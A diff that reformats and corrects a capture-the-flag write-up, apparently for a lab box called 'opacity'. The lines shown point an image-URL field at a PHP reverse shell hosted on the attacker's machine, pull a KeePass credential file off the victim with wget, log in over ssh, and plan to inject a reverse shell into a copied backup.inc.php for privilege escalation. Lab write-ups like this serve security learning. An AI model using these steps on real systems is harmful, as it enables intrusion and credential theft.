@@ -114,10 +114,11 @@ By default, this server uses port 8000.
 
 Inside the external image input I use this:
 
+```bash
 http://<your-ip>:8000/php-reverse-shell.php
+```
 
-The behavior of the site did nothing and I didnt get any log that request was made. so I guess that the file didn't make it to 
-the victim machine.
+The behavior of the site wasn't changed at all and I didn't get any log that request was made. so I guess that the file didn't make it to the victim machine.
 
 ![image](https://cdn-images-1.medium.com/max/1000/1*HgbyvK_SLT1FMCd8DXsXwg.png)
 
@@ -162,7 +163,9 @@ python3 -m http.server 2000
 
 Grab the file on your machine with:
 
+```bash
 wget http://10.10.87.30:2000/dataset.kdbx
+```
 
 ![image](https://cdn-images-1.medium.com/max/1000/1*2PRqxPLYzYME7Qqwoz8G4A.png)
 
@@ -210,9 +213,9 @@ connect it with the new credentials within the keepass file.
 ssh sysadmin@10.10.87.30
 ```
 
-enter the password and we are in.
+Enter the password and we are in.
 
-grab local.txt flag.
+Grab local.txt flag.
 
 ![image](https://cdn-images-1.medium.com/max/1000/1*0vNNZS4TzOanPZkEHrOdQA.png)
 
@@ -234,7 +237,7 @@ I can only read it.
 
 But, I'm the owner of /lib . what if Ill copy the directory to sysadmin home directory? I can modifey /lib/backup.inc.php there, then remove the original file from the original directory, the next step will be inject a reverse shell to the copied file and the last step is to copy the file back to the original directory as modified file!
 
-first step:
+First step:
 
 ```bash
 sysadmin@opacity:~/scripts$ cp -r lib ../.
